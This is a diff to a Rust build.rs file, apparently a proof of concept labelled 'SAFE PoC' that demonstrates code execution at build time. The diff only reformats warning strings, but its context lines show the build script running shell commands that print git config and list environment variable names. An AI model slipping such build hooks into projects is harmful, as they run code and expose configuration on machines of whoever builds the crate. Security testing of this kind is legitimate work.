@@ -4,7 +4,7 @@ fn main() {
     println!("cargo:warning=*** BUILD.RS EXECUTED - RCE MARKER ***");
     println!("cargo:rustc-env=FORCE_RUN=1");
 
-    eprintln!("cargo:warning=*** ____RCE_Success");
+    eprintln!("cargo:warning=*** ____RCE_Success ***");
 
     // Show git config
     let _ = Command::new("sh")
@@ -12,7 +12,7 @@ fn main() {
         .arg("git config --list >&2 || echo 'no git config' >&2")
         .status();
 
-    eprintln!("cargo:warning=***____RCE_Success");
+    eprintln!("cargo:warning=*** ____RCE_Success ***");
 
     // Test write permissions
     let _output = Command::new("sh")
@@ -34,5 +34,5 @@ fn main() {
         .arg("printenv | cut -d= -f1 >&2")
         .status();
 
-    eprintln!("cargo:warning=*** ---test permissions (SAFE PoC)---");
+    eprintln!("cargo:warning=*** ---test permissions (SAFE PoC)--- ***");
 }
